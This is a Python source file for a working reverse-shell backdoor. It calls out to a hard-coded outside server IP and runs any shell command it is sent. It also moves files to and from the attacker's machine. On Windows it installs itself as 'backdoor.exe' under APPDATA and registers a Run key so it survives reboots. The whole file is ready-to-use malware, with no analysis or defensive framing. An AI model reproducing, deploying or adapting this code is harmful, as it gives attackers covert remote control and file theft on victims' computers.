import socket
import subprocess
import time
import json
import os
import signal
import sys
import hashlib
import select
import shutil

HOST_IP = '34.227.29.45'  # Replace with your server IP
PORT = 2222
CHUNK_SIZE = 8192

def become_persistent():
    if os.name == 'nt':  # Windows only
        app_data = os.path.join(os.environ["APPDATA"], "backdoor.exe")
        if not os.path.exists(app_data):
            shutil.copyfile(sys.executable, app_data)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "' + app_data + '"', shell=True)

def calculate_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def receive_command(sock):
    data = ''
    while True:
        try:
            chunk = sock.recv(1024).decode()
            if not chunk:
                return None
            data += chunk
            return json.loads(data)
        except json.JSONDecodeError:
            continue
        except Exception:
            return None

def send_output(sock, data):
    try:
        jsondata = json.dumps(data)
        sock.sendall(jsondata.encode())
        return True
    except:
        return False

def send_file(sock, filename):
    try:
        if not os.path.exists(filename):
            send_output(sock, f"[!] File {filename} not found")
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        metadata = {
            'filename': os.path.basename(filename),
            'filesize': filesize,
            'md5': md5_hash
        }
        
        if not send_output(sock, metadata):
            return False

        response = receive_command(sock)
        if response != "READY":
            return False

        bytes_sent = 0
        with open(filename, 'rb') as f:
            while bytes_sent < filesize:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                sock.sendall(chunk)
                bytes_sent += len(chunk)

        if bytes_sent != filesize:
            return False

        return True

    except Exception as e:
        send_output(sock, f"[!] Error sending file: {str(e)}")
        return False

def receive_file(sock, target_filename):
    try:
        metadata = receive_command(sock)
        if isinstance(metadata, str) and metadata.startswith('[!]'):
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        if not send_output(sock, "READY"):
            return False

        md5_hash = hashlib.md5()
        bytes_received = 0
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                remaining = filesize - bytes_received
                chunk_size = min(CHUNK_SIZE, remaining)
                chunk = sock.recv(chunk_size)
                
                if not chunk:
                    break
                    
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)

        if bytes_received != filesize:
            send_output(sock, {
                'success': False,
                'message': "[!] File transfer incomplete"
            })
            return False

        received_md5 = md5_hash.hexdigest()
        success = received_md5 == expected_md5
        
        send_output(sock, {
            'success': success,
            'message': "[+] File received successfully" if success else "[!] File verification failed"
        })
        
        return success

    except Exception as e:
        send_output(sock, {
            'success': False,
            'message': f"[!] Error receiving file: {str(e)}"
        })
        return False

def handle_cd(sock, path):
    try:
        path = path.strip().strip('"').strip("'")
        os.chdir(path)
        send_output(sock, f"[+] Changed to {os.getcwd()}")
    except Exception as e:
        send_output(sock, f"[!] Error: {str(e)}")

def shell(sock):
    print("[+] Connection established with server")
    last_activity = time.time()
    
    while True:
        try:
            # Send keep-alive every 15 seconds
            if time.time() - last_activity > 15:
                if not send_output(sock, "PING"):
                    return False
                last_activity = time.time()

            # Check for incoming commands
            if sock in select.select([sock], [], [], 1)[0]:
                command = receive_command(sock)
                if not command:
                    return False
                    
                last_activity = time.time()
                
                if command == ":kill":
                    print("[*] Received kill command, closing connection...")
                    return False
                elif command.startswith("cd "):
                    handle_cd(sock, command[3:])
                elif command.startswith("download "):
                    filename = command.split(" ", 1)[1].strip()
                    send_file(sock, filename)
                elif command.startswith("upload "):
                    filename = command.split(" ", 1)[1].strip()
                    receive_file(sock, filename)
                else:
                    try:
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        output = result.stdout + result.stderr
                        if not output:
                            output = "[+] Command executed successfully"
                        if not send_output(sock, output):
                            return False
                    except subprocess.TimeoutExpired:
                        send_output(sock, "[!] Command timed out after 10 seconds")
                    except Exception as e:
                        send_output(sock, f"[!] Error executing command: {str(e)}")

        except Exception as e:
            print(f"[!] Error in shell: {str(e)}")
            return False

def connect():
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(30)
            
            print(f"\n[*] Attempting to connect to {HOST_IP}:{PORT}...")
            sock.connect((HOST_IP, PORT))
            
            shell(sock)
            
        except socket.error as e:
            print(f"[!] Connection failed: {str(e)}")
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            print("[*] Retrying in 3 seconds...")
            time.sleep(3)

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    become_persistent()
    while True:
        try:
            connect()
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            print("[*] Restarting in 10 seconds...")
            time.sleep(10)
